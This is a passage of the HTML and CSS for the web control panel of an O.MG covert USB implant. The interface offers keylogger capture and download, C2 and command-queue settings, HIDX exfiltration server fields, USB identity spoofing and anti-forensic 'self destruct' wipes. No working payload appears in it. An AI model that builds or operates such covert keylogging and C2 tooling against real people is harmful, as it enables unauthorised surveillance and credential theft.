			position: absolute;
			top: 0;
			right: 0;
			margin-right: 14px;
			background-color: rgba(0, 0, 0, .5);
			color: #fff;
			font-size: 12px;
			z-index: 10;
		}

		.editor {
			background-color: var(--bgColor3);
			border-color: var(--bgColor2);
			color: var(--fontColor);
			border-left-width: 4px;
			font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
			font-size: 16px;
			font-weight: 400;
			line-height: 1.3;
			outline: 0;
			overflow-y: auto;
			margin-left: 11px;
			height: calc(100vh - 185px);
			padding-bottom: 0;
			border-bottom: 0;
		}

		.editor div {
			display: block;
		}

		.editorKeylog {
			padding-bottom: 0;
			border-bottom: 0;
			height: calc(100vh - 185px);
			border-left-color: var(--accentGradient1);
		}

		.editorKeylog,
		.editorSyslog,
		.editorc2log,
		.editorPayload {
			background-color: var(--bgColor3);
			border-color: var(--bgColor2);
			color: var(--fontColor);
			display: inline-flex;
			margin-left: 11px;
			width: calc(100% - 22px);
			border-left-width: 0px;
			font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
			font-size: 16px;
			font-weight: 400;
			line-height: 1.3;
		}

		.editorSyslog,
		.editorc2log {
			height: calc(100vh - 117px);
			border-left-color: var(--inactiveGradient1);
		}

		.fccNotice {
			font-size: 12px;
		}

		.footer {
			width: calc(100% - 22px);
			padding-top: 0;
		}

		.headingModal {
			height: 40px;
		}

		.helpHeader {
			background: var(--inactiveColor);
			background-image: -webkit-linear-gradient(top, var(--inactiveGradient1), var(--inactiveGradient2));
			background-image: -moz-linear-gradient(top, var(--inactiveGradient1), var(--inactiveGradient2));
			background-image: -ms-linear-gradient(top, var(--inactiveGradient1), var(--inactiveGradient2));
			background-image: -o-linear-gradient(top, var(--inactiveGradient1), var(--inactiveGradient2));
			background-image: linear-gradient(to bottom, var(--inactiveGradient1), var(--inactiveGradient2));
			-webkit-border-radius: 5;
			-moz-border-radius: 5;
			border-radius: 5px;
			color: var(--navColor);
			width: 100%;
		}

		.hidden {
			display: none;
		}

		.key {
			background-color: var(--bgColor3);
			display: grid;
			grid-template-columns: 50% 50%;
			grid-row: auto auto;
		}

		.navLabel {
			vertical-align: middle;
		}

		.partitionEditorFieldWrapper {
			display: flex;
		}

		.partitionEditorFieldLabel {
			width: 140px;
		}

		.progressBar {
			color: var(--fontColor);
			background-color: var(--bgColor3);
			font-size: 10px;
		}

		.progressFilled,
		.progressFilled:after,
		.progressFilled:before {
			padding: .01em;
			color: var(--fontColor);
			background-color: var(--accentGradient1);
			text-align: center;
			margin-bottom: 4px;
		}

		.submitButton {
			position: relative;
			display: grid;
			font-size: large;
			color: var(--navColor);
			background-color: inherit;
			border-color: var(--bgColor2);
		}

		.subnav {
			display: flex;
			flex-grow: auto;
			padding-left: 10px;
			padding-top: 10px;
			margin-bottom: 0;
			padding-bottom: 0;
		}

		.footer button {
			border-top-left-radius: 0;
			border-top-right-radius: 0;
			margin-inline: 1px;
		}

		.subnav svg {
			padding-right: 10px;
		}

		.subnav {
			width: calc(100% - 20px);
		}

		.subnavSidebar {
			width: calc(100% - 325px - 20px);
		}

		.toast {
			-webkit-animation: slide .5s forwards;
			-webkit-animation-delay: 4s;
			animation: slide .5s forwards;
			animation-delay: 4s;
			background: var(--bgColor3);
			border-radius: 10px;
			box-shadow: inset 20px 20px 30px var(--inactiveGradient1), inset -20px -20px 30px var(--inactiveGradient2);
			color: var(--navColor);
			display: inline-block;
			float: left;
			font-size: 1rem;
			font-weight: 700;
			right: 350px;
			max-height: 120px;
			min-height: 48px;
			overflow: hidden;
			padding-left: 5px;
			position: absolute;
			text-overflow: clip;
			text-transform: uppercase;
			top: 1px;
			white-space: wrap;
			width: 320px
		}

		.toggle-button {
			background: var(--bgColor1);
			width: 80px;
			height: 20px;
			border-radius: 30px;
			padding: 5px;
			cursor: pointer;
			transition: all 300ms ease-in-out;
		}

		.toggle-button>.inner-circle {
			background: var(--navColor);
			width: 20px;
			height: 20px;
			border-radius: 50%;
			transition: all 300ms ease-in-out;
		}

		.toggle-button.active {
			background: var(--toggleOnColor);
		}

		.toggle-button.active>.inner-circle {
			margin-left: 60px;
		}

		.updateButton,
		.updateButtonLarge {
			position: relative;
			display: inline-block;
			color: var(--navColor);
			background-color: inherit;
			border-color: var(--bgColor2);
			height: 24px;
			top: 0;
			left: -6px;
			padding-top: 3px;
		}

		.updateButtonLarge {
			height: 40px;
			top: -4px;
			left: -4px;
			margin-left: 0;
			align-items: center;
			justify-content: center;
			text-align: center;
		}

		.buttonMergeLeft {
			border-top-left-radius: 0;
			border-bottom-left-radius: 0;
		}

		.buttonMergeRight {
			border-top-right-radius: 0;
			border-bottom-right-radius: 0;
		}

		.visible {
			visibility: visible;
		}

		.wifiSignalOn {
			fill: var(--navColor);
		}

		dialog {
			width: 60%;
			height: fit-content;
			background: #111;
			color: var(--navColor);
			border-radius: 10px;
			border-color: var(--bgColor2);
		}

		.close-button {
			position: absolute;
			top: 10px;
			right: 10px;
			border: none;
			background: transparent;
			font-size: 20px;
			cursor: pointer;
		}

		#color-container {
			position: relative;
			width: 100%;
			height: 40px;
		}

		#color-slider {
			position: absolute;
			top: 12px;
			width: 200px;
			margin: 0;
			z-index: 1;
		}

		#color-box {
			position: absolute;
			top: 10px;
			width: 200px;
			height: 20px;
			background: linear-gradient(to right, hsl(0, 70%, 50%), hsl(120, 70%, 50%), hsl(240, 70%, 50%), hsl(359, 70%, 50%));
			border-radius: 10px;
		}

		#apply-color {
			position: absolute;
			top: 0px;
			right: 20px;
		}

		@media (max-width:700px) {
			#navbarAlerts {
				display: none;
			}
		}

		@media (max-width:530px) {
			body {
				height: var(--app-height)
			}

			.navLabel {
				display: none
			}

			.navIcon {
				display: none
			}

			.contentFullscreen {
				width: calc(100%);
			}

			.contentFooter {
				width: calc(100% - 40px);
			}

			.contentSidebar {
				display: none
			}

			.subnavFullscreen {
				width: calc(100% - 20px)
			}

			.subnavSidebar {
				display: none
			}

			#sidebar {
				width: 100%
			}

			#navbarAlerts {
				display: none;
			}
		}

		@media (max-width:414px) {
			.toast {
				right: 50px;
			}

		}

		@media (max-width:1px) {
			nav {
				display: none
			}

			#content,
			#subnav,
			.editor,
			.footer {
				padding: 0;
				margin: 0;
				width: 100vw
			}

			.editor {
				height: 100vh
			}
		}

		@keyframes spin {
			0% {
				transform: rotate(0deg);
			}

			to {
				transform: rotate(360deg);
			}
		}

		@keyframes pulse {
			0% {
				transform: scale(0.95);
				box-shadow: 0 0 0 0 var(--inactiveColor);
			}

			70% {
				transform: scale(0.80);
				box-shadow: 0 0 0 3px var(--inactiveGradient2);
			}

			100% {
				transform: scale(0.95);
				box-shadow: 0 0 0 0 var(--inactiveColor);
			}
		}

		.tooltip,
		.input-wrapper {
			position: relative;
		}

		.tooltiptext {
			position: absolute;
			visibility: hidden;
			background-color: red;
			color: #fff;
			font-size: 0.8em;
			text-align: center;
			border-radius: 6px;
			padding: 5px 0;
			z-index: 1;
			top: 120%;
			left: 0;
			border-width: 5px;
			border-style: solid;
			border-color: transparent transparent red transparent;
		}

		.tooltiptext::after {
			content: "";
			position: absolute;
			bottom: 100%;
			margin-left: -240px;
			border-width: 15px;
			border-style: solid;
			border-color: transparent transparent red transparent;
		}

		.arrowTop {
			top: -10px;
		}

		.arrowTop::after {
			top: 100%;
			border-color: red transparent transparent transparent;
		}

		.editor-wrapper {}

		#lineNumbers {
			width: 30px;
			left: 12px;
			background-color: var(--inactiveGradient2);
			padding: 5px;
			text-align: right;
			line-height: 1.5em;
			line-height-step: 1.5em;
			font-family: monospace;
			position: absolute;
			height: 100%;
			z-index: -1;
		}

		#payload {
			padding: 5px;
			left: 52px;
			margin-left: 0px;
			border: none;
			outline: none;
			line-height: 1.5em;
			line-height-step: 1.46em;
			font-family: monospace;
			white-space: pre;
			background: transparent;
			position: relative;
			z-index: 0;
			background-color: var(--bgColor3);
			width: calc(100% - 63px);
			margin-bottom: -7px;
		}

		.line-red {
			background-color: red;
			width: 30px;
			padding-right: calc(100vw - 55px);
		}

		.line-orange {
			background-color: orange;
			width: 30px;
			padding-right: calc(100vw - 55px);
		}

		.line-yellow {
			background-color: yellow;
			width: 30px;
			padding-right: calc(100vw - 55px);
		}

		.line-green {
			background-color: green;
			width: 30px;
			padding-right: calc(100vw - 55px);
		}

		.line-blue {
			background-color: blue;
			width: 30px;
			padding-right: calc(100vw - 55px);
		}

		.line-purple {
			background-color: purple;
			width: 30px;
			padding-right: calc(100vw - 55px);
		}


		.apply-effect {
			animation: glowing 1s;
			-webkit-animation: glowing 1s;
			box-shadow: 0 0 0px red, 0 0 0px red, 0 0 0px red, 0 0 0px red;
			-webkit-box-shadow: 0 0 0px red, 0 0 0px red, 0 0 0px red, 0 0 0px red;
		}

		.glowing-effect {
			animation: glowing 1s infinite;
			-webkit-animation: glowing 1s infinite;
			box-shadow: 0 0 1px red, 0 0 3px red, 0 0 5px red, 0 0 7px red;
			-webkit-box-shadow: 0 0 1px red, 0 0 3px red, 0 0 5px red, 0 0 7px red;
		}

		@keyframes glowing {
			0% {
				box-shadow: 0 0 4px red, 0 0 6px red, 0 0 8px red, 0 0 10px red;
			}

			50% {
				box-shadow: 0 0 8px red, 0 0 10px red, 0 0 12px red, 0 0 14px red;
			}

			100% {
				box-shadow: 0 0 4px red, 0 0 6px red, 0 0 8px red, 0 0 10px red;
			}
		}

		@-webkit-keyframes glowing {
			0% {
				-webkit-box-shadow: 0 0 4px red, 0 0 6px red, 0 0 8px red, 0 0 10px red;
			}

			50% {
				-webkit-box-shadow: 0 0 8px red, 0 0 10px red, 0 0 12px red, 0 0 14px red;
			}

			100% {
				-webkit-box-shadow: 0 0 4px red, 0 0 6px red, 0 0 8px red, 0 0 10px red;
			}
		}
	</style>
</head>

<body>
	<nav>
		<div class="left-side">
			<div id="logoBar"><svg id="logo" xmlns="http://www.w3.org/2000/svg" xml:space="preserve" class="iconColor" viewBox="110 25 82 50"></svg> <span id="modelText" class="visible"></span></div>
			<div id="navbar-wifiIcon"><svg id="ico_wifi" xml:space="preserve" viewBox="0 0 24.38 30">
					<path id="networkIn" class="networkIn" fill="white" d="m8.44,30s-1.87-1.88-8.44-11.25h3.75v-5.63h1.87v7.5h-2.29c4.16,5.62,5.1,6.39,5.1,6.39,0,0,.94-.76,5.1-6.39h-2.29v-5.62h1.88v3.75h3.75c-6.56,9.38-8.44,11.25-8.44,11.25Z" />
					<path id="networkOut" class="networkOut" fill="white" d="m15.94,0s1.88,1.88,8.44,11.25h-3.75v5.63h-1.88v-7.5h2.29c-4.16-5.62-5.1-6.39-5.1-6.39,0,0-.94.76-5.1,6.39h2.29v5.63h-1.88v-3.75h-3.75C14.06,1.88,15.94,0,15.94,0Z" />
				</svg></div>
			<div id="wifiDetails"><span id="wifiRTT"></span></div>
			<div id="deviceSelect"></div>
			<div id="navbarAlerts"></div>
		</div>
		<div class="right-side">
			<div id="navbar-Links"><a id="navbar-Links-settings" data-target="#modal-settings" href="#" onclick="sidebarAreaToggle('settings')"><svg id="ico_settings" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"></svg> <span class="navLabel">SETTINGS</span> </a><a id="navbar-Links-about" data-target="#modal-about" href="#" onclick="sidebarAreaToggle('about')"><svg id="ico_about" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"></svg> <span class="navLabel">ABOUT</span> </a><a id="navbar-Links-help" data-target="#modal-help" href="#" onclick="sidebarAreaToggle('help')"><svg id="ico_help" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"></svg> <span class="navLabel">HELP</span></a></div>
		</div>
	</nav>
	<div id="subnav" class="subnav"><button id="contentSubNav_syslog" onclick="contentAreaToggle('syslog')"><svg id="ico_syslog" xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>log</span><span id="syslogStatusLight">&nbsp;</span></button> <button id="contentSubNav_c2log" onclick="contentAreaToggle('c2log')" class="hidden"><svg id="ico_syslog" xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>c2log</span><span id="c2logStatusLight">&nbsp;</span></button> <button id="contentSubNav_keylog" class="keylog hidden" onclick="contentAreaToggle('keylog')"><svg id="ico_keylog" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>Keylog</span><span id="keylogStatusLight">&nbsp;</span></button> <button id="contentSubNav_payload" onclick="contentAreaToggle('payload')" class="buttonSelected hidden"><svg id="ico_payload" xmlns="http://www.w3.org/2000/svg" data-keyloggingOn height="24" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>Payload</span><span id="payloadStatusLight">&nbsp;</span></button> <button id="contentSubNav_debug" class="hidden" onclick="contentAreaToggle('debug')">Debug</button></div>
	<div id="sidebar" class="hidden">
		<div id="sidebar_settings" class="hidden"><button class="close" type="button" onclick="sidebarAreaToggle('close')"><span>&times;</span></button>
			<h1>Settings</h1>
			<div id="sidebar_settings_subnav" class="subnav"><button id="sidebarNav_queue" onclick="sidebarSettingsAreaToggle('queue')" class="hidden">Queue</button> <button id="sidebarNav_net" onclick="sidebarSettingsAreaToggle('net')" class="buttonSelected">Net</button> <button id="sidebarNav_config" onclick="sidebarSettingsAreaToggle('config')">USB</button> <button id="sidebarNav_debug" onclick="sidebarSettingsAreaToggle('debug')">GENERAL</button></div>
			<div id="sidebar_settings_queue" class="hidden"><label for="data">Add CMD to Queue:</label> <input type="text" id="data" name="data"> <button id="modifyQueueC2">Submit</button><br><label for="queueContactRate">Contact Rate:</label> <input type="text" id="queueContactRate" name="queueContactRate"> <label for="queuePollRate">Poll Rate:</label> <input type="text" id="queuePollRate" name="queuePollRate"> <label for="queueFastRate">Fast Rate:</label> <input type="text" id="queueFastRate" name="queueFastRate"> <button id="queuePollUpdate" onclick="changePollRate()">Update Queue Polling Rates</button>
				<table id="cmdQueueTable">
					<thead>
						<tr>
							<th>Command</th>
							<th>Action</th>
						</tr>
					</thead>
					<tbody></tbody>
				</table><br><button id="deleteAllButton">Delete All in Queue</button><br><button id="queryDeviceStatus">Query Device Status</button><br>
				<div class="button-container"><label for="c2logAlwaysShow">Always Show Last Check-In</label>
					<div id="c2logAlwaysShow" class="toggle-button" onclick="document.getElementById(`c2logAlwaysShow`).classList.toggle('active'); if(this.classList.contains('active')) { alwaysDisplayLastPoll = '1'; sendMessage(`CTSet\tshowmsgtime\t1`); } else { alwaysDisplayLastPoll = '0'; sendMessage(`CTSet\tshowmsgtime\t0`); };">
						<div class="inner-circle"></div>
					</div>
				</div>
				<div class="button-container"><label for="c2logAbridge">C2 Log Abridge</label>
					<div id="c2logAbridge" class="toggle-button" onclick="document.getElementById(`c2logAbridge`).classList.toggle('active'); if(this.classList.contains('active')) { c2logAbridge = '1' } else { c2logAbridge = '0' };">
						<div class="inner-circle"></div>
					</div>
				</div><br><button id="clearLogsButton">Clear &nbsp;<data id="clearLogsAlias"></data>&nbsp; Logs</button> <button id="clearAllLogsButton">Clear All Logs</button>
			</div>
			<div id="sidebar_settings_net">
				<div id="wifi-Settings">
					<h3>WiFi Settings</h3><label for="device-WIFIMode">WiFi Mode</label><data id="device-WIFIMode" class="hidden"></data><input type="radio" id="CW0" name="WIFIMode" value="AP"><data>AP (Broadcast a new AP)</data><br><input type="radio" id="CW1" name="WIFIMode" value="Station"><data>Station (Connect to Infrastructure)</data>
					<div class="input-wrapper"><label for="device-WIFISSID">SSID</label> <input type="text" id="device-WIFISSID" name="device-WIFISSID" spellcheck="false" pattern="^[\x00-\x7F]{1,32}$|^$" title="SSID must be 1-32 ASCII Characters." type="pattern" oninput="checkInput(this, 'tooltipwifissid')"> <span class="tooltiptext" id="tooltipwifissid"></span></div>
					<div class="input-wrapper"><label for="device-WIFIPassword">Password (8-63 Characters, 0 = Open)</label> <input class="tooltip" type="text" id="device-WIFIPassword" name="device-WIFIPassword" spellcheck="false" pattern="^[\x00-\x7F]{8,63}$|^$" title="Password must be 8-63 ASCII Characters." type="pattern" oninput="checkInput(this, 'tooltipwifipass')"> <span class="tooltiptext" id="tooltipwifipass"></span></div><label for="device-WIFIChannel">Channel</label> <input type="text" id="device-WIFIChannel" name="device-WIFIChannel" spellcheck="false"> <label for="device-CustomMACAddress">Custom MAC (Default:<data id="device-HardwareMACAddress"></data>)</label> <input type="text" id="device-CustomMACAddress" name="device-CustomMACAddress" spellcheck="false"> <label for="device-IPAddress">Device IP Address</label> <span type="text" id="device-IPAddress"></span> <button id="update-WIFISettings" class="submitButton" onclick="applyEffect(this); updateWifiSettings();">Change Settings</button>
				</div>
				<div id="c2-Settings" class="c2">
					<h3>C2 Settings</h3>
					<p>C2 is currently in beta. Click <a href="https://github.com/O-MG/O.MG-Firmware/wiki/Elite-Early-Access#c2">https://github.com/O-MG/O.MG-Firmware/wiki/Elite-Early-Access#c2</a> to learn more.</p><label for="c2config">C2 Config - <span id="c2configApplied"></span></label> <input type="text" id="c2config" name="c2config" spellcheck="false"> <button id="update-C2Settings" class="submitButton" onclick="updateC2Settings()">Change Settings</button>
					<div class="button-container"><label for="c2status">C2</label>
						<div id="c2status" class="toggle-button" onclick="document.getElementById(`c2status`).classList.toggle('active'); if(this.classList.contains('active')) { sendMessage(`C2Start`) } else { sendMessage(`C2Stop`); };">
							<div class="inner-circle"></div>
						</div>
					</div><button id="button-C2Wipe" class="submitButton hidden" onclick="sendMessage('C2Wipe')">Erase C2 Config</button>
				</div>
			</div>
			<div id="sidebar_settings_config" class="hidden">
				<h3>USB ID Defaults</h3><label>Change the default USB identifiers. Any identifiers specified in a payload will override these defaults.</label><br><label for="device-USBVID">USB Vendor ID</label> <input type="text" id="device-USBVID" name="device-USBVID"> <label for="device-USBPID">USB Product ID</label> <input type="text" id="device-USBPID" name="device-USBPID"> <label for="device-USBMAN">USB Manufacturer</label> <input type="text" id="device-USBMAN" name="device-USBMAN"> <label for="device-USBPRO">USB Product</label> <input type="text" id="device-USBPRO" name="device-USBPRO"> <label for="device-USBSER">USB Serial Number</label> <input type="text" id="device-USBSER" name="device-USBSER"> <button class="submitButton" id="update-USBIDs" onclick="applyEffect(this); updateUSBIDs();">Update All USB IDs at once</button>
				<div class="hidx">
					<h4>Experimental Speed</h4><select name="experimentalSpeed" id="experimentalSpeed" onchange="sendMessage(`CTSet\tusbinterval\t${this.value}`);sendMessage(`CTList`);">
						<option value="10">100%</option>
						<option value="8">125%</option>
						<option value="4">250%</option>
						<option value="2">500%</option>
						<option value="1">1000%</option>
					</select> <button class="submitButton" id="experimentalSpeed" onclick="applyEffect(this); sendMessage(`CR1`)">Apply + Reboot</button>
				</div>
				<div id="hidx-Settings" class="hidx">
					<h3>HIDX Settings</h3>
					<div class="button-container"><label for="hidxstatusfile">HIDX File</label>
						<div id="hidxstatusfile" class="toggle-button" onclick="document.getElementById(`hidxstatusfile`).classList.toggle('active'); if(this.classList.contains('active')) { sendMessage(`CHStart\tF\thidxfile`) } else { sendMessage(`CHStop`); };">
							<div class="inner-circle"></div>
						</div>
					</div>
					<div class="button-container"><label for="hidxstatustcp">HIDX TCP</label>
						<div id="hidxstatustcp" class="toggle-button" onclick="document.getElementById(`hidxstatustcp`).classList.toggle('active'); if(this.classList.contains('active')) { sendMessage(`CHStart\tT`) } else { sendMessage(`CHStop`); };">
							<div class="inner-circle"></div>
						</div>
					</div><label for="hidxhost">HIDX Server Address</label> <input type="text" id="hidxhost" name="hidxhost" spellcheck="false"> <label for="hidxport">HIDX Server Port</label> <input type="text" id="hidxport" name="hidxport" spellcheck="false"> <label for="hidxboot">HIDX AutoStart on Boot</label>
					<div class="button-container">
						<div id="hidxboot" class="toggle-button" onclick="document.getElementById(`hidxboot`).classList.toggle('active'); if(this.classList.contains('active')) { sendMessage(`CTSet\thidxboot\t1`) } else { sendMessage(`CTSet\thidxboot\t0`); };">
							<div class="inner-circle"></div>
						</div>
					</div><button id="update-HIDXSettings" class="submitButton" onclick="applyEffect(this); updateHIDXSettings(); sendMessage(`CR1`);">Change Settings</button>
				</div>
				<h3>Toggles</h3><label for="toggle-BootScript">BootScript</label>
				<div class="button-container">
					<div id="toggle-BootScript" class="toggle-button" onclick="if(this.classList.contains('active')) { payloadSetBootSlot('off') } else { payloadSetBootSlot('on'); };">
						<div class="inner-circle"></div>
					</div>
				</div><label for="toggle-CU">USB</label>
				<div class="button-container">
					<div id="toggle-CU" class="toggle-button" onclick="document.getElementById(`toggle-CU`).classList.toggle('active'); if(this.classList.contains('active')) { sendMessage(`CU1`) } else { sendMessage(`CU0`); document.getElementById(`toggle-CJ`).classList.remove(`active`); }">
						<div class="inner-circle"></div>
					</div>
				</div><label for="toggle-CJ">Mouse Jiggler</label>
				<div class="button-container">
					<div id="toggle-CJ" class="toggle-button" onclick="document.getElementById(`toggle-CJ`).classList.toggle('active'); if(this.classList.contains('active')) { sendMessage(`CJ1`); document.getElementById(`toggle-CU`).classList.add(`active`); } else { sendMessage(`CJ0`) }">
						<div class="inner-circle"></div>
					</div>
				</div>
			</div>
			<div id="sidebar_settings_keylog" class="hidden">
				<h3>Keylog Settings</h3><button class="closeModal" type="button" onclick="keylogOptionsMenu('close')">&times;</button>
			</div>
			<div id="sidebar_settings_debug" class="hidden">
				<div>
					<h3>General</h3><label for="sidebar_settings_debug_partitionEditor">Partition Editor</label> <button class="plus" id="sidebar_settings_debug_partitionEditor" onclick="partitionEditorCurrent(); generatePartitionEditor(); viewDialog('partitionEditor', 'open')">Partition Editor</button> <label for="uiAccentColor">Theme</label> <select name="uiAccentColor" id="uiAccentColor" onchange="sendMessage(`CTSet\tuicolor\t${this.value}`);sendMessage(`CTList`);setAccentColors(this.value)">
						<option value="red">Red</option>
						<option value="orange">Orange</option>
						<option value="yellow">Yellow</option>
						<option value="green">Green</option>
						<option value="cyan">Cyan</option>
						<option value="teal">Teal</option>
						<option value="blue">Blue</option>
						<option value="purple">Purple</option>
						<option value="pink">Pink</option>
						<option value="fuchsia">Fuchsia</option>
						<option value="maroon">Maroon</option>
						<option value="brown">Brown</option>
						<option value="grey">Grey</option>
						<option id="uicolorCustom" value="custom">Custom</option>
					</select> <label for="uiAccentColor">Custom Color</label>
					<div id="color-container"><span><input type="range" id="color-slider" min="0" max="360" value="0">
							<div id="color-box"></div>
						</span><span><button id="apply-color" onclick="applyEffect(this);">Save</button></span></div><label for="debugLevel">Log Level</label> <select name="debugLevel" id="debugLevel">
						<option value="NONE">NONE</option>
						<option value="INFO">INFO</option>
						<option value="WARN">WARN</option>
						<option value="CRIT">CRIT</option>
						<option value="DIAG">DIAG</option>
						<option value="DEBUG">DEBUG</option>
					</select> <label for="sidebar_settings_debug_feLog">Download Frontend Log</label> <button class="submitButton" id="sidebar_settings_debug_feLog" onclick="applyEffect(this); downloadFrontendlog();">Download Frontend Log</button><br><label for="sidebar_settings_config_reboot">Reboot</label> <button class="submitButton" id="sidebar_settings_config_reboot" onclick="applyEffect(this); sendMessage(`CR1`)">Reboot</button>
					<div class="selfDestruct">
						<h3>Self Destruct</h3><button class="submitButton" id="sidebar_settings_config_selfDestructFull" onclick="applyEffect(this); sendMessage(`CD1`)">Self Destruct (Full)</button>
						<aside>Completely erase all data and disconnect data lines to make device behave "broken". You will need to reflash the firmware to recover.</aside><br><button class="submitButton" id="sidebar_settings_config_selfDestructPartial" onclick="applyEffect(this); sendMessage(`CD2`)">Self Destruct (Partial)</button>
						<aside>Erase all data, but leave data lines connected, so it behaves like a normal device. You will need to reflash the firmware to recover.</aside>
					</div>
					<h2>Custom Command</h2><label for="customCommandInput">Input</label> <input type="text" id="customCommandInput" name="customCommandInput" spellcheck="false"> <button id="customCommandRun" class="updateButton" onclick="applyEffect(this); issueCustomCommand();">Run</button> <label for="customCommandOutput">Output</label> <textarea id="customCommandOutput" spellcheck="false"></textarea> <button id="enableDebugMenu" class="" onclick="applyEffect(this); document.getElementById(`contentSubNav_debug`).classList.remove(`hidden`);document.getElementById(`debug-info`).classList.remove(`hidden`);document.getElementById(`footerNavPayloadEvalByLine`).classList.remove(`hidden`);document.getElementById(`footerNavPayloadRunByLine`).classList.remove(`hidden`);">Enable Debug Menu</button>
				</div>
			</div>
		</div>
		<div id="sidebar_about" class="hidden"><button class="close" type="button" onclick="sidebarAreaToggle('close')"><span>&times;</span></button>
			<h1>About</h1>
			<div>
				<h2>Details</h2>
				<div>Backend Version: <span id="device-VersionNumber"></span></div>
				<div>Frontend Version: <span id="frontend-VersionNumber"></span></div>
				<div>Model: <span id="device-TypeDecoded"></span></div><span id="device-Model" class="hidden"></span> <span id="device-Type" class="hidden"></span>
			</div>
			<h2>Release Team</h2>
			<div id="releaseTeam" class="about-section-credits"></div>
			<div class="about-team-name">More Information found at:</div>
			<div class="about-twitter"><a href="https://o.mg.lol/team/">https://o.mg.lol/team/</a></div>
			<h2 class="visible">Regulatory</h2><button class="visible" id="sidebar_settings_about_regulatoryButton" onclick="applyEffect(this); createRegulatory();">Regulatory Info</button>
		</div>
		<div id="sidebar_help" class="hidden"><button class="close" type="button" onclick="sidebarAreaToggle('close')"><span>&times;</span></button>
			<h1>Help</h1><input type="text" id="search" placeholder="Search Help...">
			<h3>Keymap Viewer</h3><button class="submitButton helpHeader" id="sidebar_settings_help_keymapViewer" onclick="viewDialog('keymapViewer', 'open'); sidebarAreaToggle('close');">Show Keymap Viewer</button>
			<h3>O.MG DuckyScript Syntax Guide</h3>
			<div id="helpExamples"><button id="btn_helppayloadGithub" class="helpHeader" onclick="document.getElementById('helppayloadGithub').classList.toggle('hidden');">Hak5 Community Payloads</button>
				<div id="helppayloadGithub" class="hidden">
					<p>Community created payloads can be found at: <a href="http://github.com/hak5/omg-payloads" target="_blank">http://github.com/hak5/omg-payloads</a></p>
					<p>If you have internet access, you can also search below.</p><input id="searchGithubPayloads" type="text" placeholder="Search Github..."> <button class="updateButton buttonMergeLeft" onclick="searchGithubPayloads()">Search</button><br>
					<div id="githubPayloadExamples"></div><br>
				</div><button id="btn_helppayloadExample" class="helpHeader" onclick="document.getElementById('helppayloadExample').classList.toggle('hidden');">Example Payloads</button>
				<div id="helppayloadExample" class="hidden"></div><button id="btn_helppayload" class="helpHeader" onclick="document.getElementById('helppayload').classList.toggle('hidden');">General</button>
				<div id="helppayload" class="hidden"></div><button id="btn_helpkeylog" class="helpHeader keylog" onclick="document.getElementById('helpkeylog').classList.toggle('hidden');">Keylogger</button>
				<div id="helpkeylog" class="keylog hidden"></div><button id="btn_helpselfDestruct" class="helpHeader selfDestruct" onclick="document.getElementById('helpselfDestruct').classList.toggle('hidden');">Self-Destruct</button>
				<div id="helpselfDestruct" class="selfDestruct hidden"></div><button id="btn_helppayloadGeofencing" class="helpHeader" onclick="document.getElementById('helppayloadGeofencing').classList.toggle('hidden');">Geofencing</button>
				<div id="helppayloadGeofencing" class="hidden"></div><button id="btn_helppayloadUSBIDs" class="helpHeader" onclick="document.getElementById('helppayloadUSBIDs').classList.toggle('hidden');">USB Device ID</button>
				<div id="helppayloadUSBIDs" class="hidden"></div><button id="btn_helpglobalKeys" class="helpHeader" onclick="document.getElementById('helpglobalKeys').classList.toggle('hidden');">Global Keys</button>
				<div id="helpglobalKeys" class="hidden"></div>
			</div>
		</div>
	</div>
	<div id="content" class="contentFullscreen">
		<content id="contentArea_keylog" class="hidden keylog"><label for="keylog" class="hidden">Keylog Area</label> <textarea id="keylog" spellcheck="false" class="editorKeylog" readonly="readonly" placeholder="Keylogger output"></textarea>
			<div id="keylogStorage" class="footer"><label for="keylogStorage">Storage Used:<data id="keylogStoragePercent">&nbsp;</data></label>
				<div id="keylogStorageUsed" class="progressBar">
					<div id="keylogStorageUsedBar" class="progressFilled" style="width:0.2%">&nbsp;</div>
				</div>
			</div>
			<div id="footerKeylog" class="subnav footer"><button id="footerNavKeylogDownload" onclick="applyEffect(this); downloadKeylog('1')"><svg id="ico_keylogDownload" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>Show All</span></button> <button id="footerNavKeylogSave" onclick="applyEffect(this); saveKeylog()"><svg id="ico_keylogSave" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>Download</span></button> <button id="footerNavKeylogLiveStatus" onclick="liveLog();"><svg id="ico_keylogLiveLog" xml:space="preserve" class="iconColor navIcon" viewBox="0 0 40 40"></svg> <span>LiveView</span></button> <button id="footerNavKeylogStatus" onclick="keylogStartStop();"><svg id="ico_keylogRun" xml:space="preserve" class="iconColor navIcon" viewBox="0 0 40 40"></svg> <span id="keylogStartButton">Start</span></button></div>
		</content>
		<content id="contentArea_payload" class="visible">
			<div class="editor-wrapper">
				<div id="lineNumbers"></div><textarea id="payload" class="editor" spellcheck="false">DUCKY_LANG US
DELAY 2000
</textarea> <textarea id="payloadoutput" readonly="readonly" class="hidden"></textarea>
				<div id="debug-info" class="debug-info hidden"></div>
				<div id="payloadEditorFile"><span>File: </span><span id="payloadEditorFilename">unsaved</span><span id="payloadEditorBootable"></span> (<span id="payloadEditorSaved">unsaved</span>)</div>
			</div>
			<div id="payloadStorage" class="footer"><label for="payloadStorageUsed">Storage Used:<data id="payloadStoragePercent">0%</data></label>
				<div id="payloadStorageUsed" class="progressBar">
					<div id="payloadStorageUsedBar" class="progressFilled" style="width:0.2%">&nbsp;</div>
				</div>
			</div>
			<div id="payloadRun" class="footer hidden"><label for="payloadRunPercentDiv">Execution:<data id="payloadRunPercent">0%</data></label>
				<div id="payloadRunPercentDiv" class="progressBar">
					<div id="payloadRunPercentBar" class="progressFilled" style="width:0%">&nbsp;</div>
				</div>
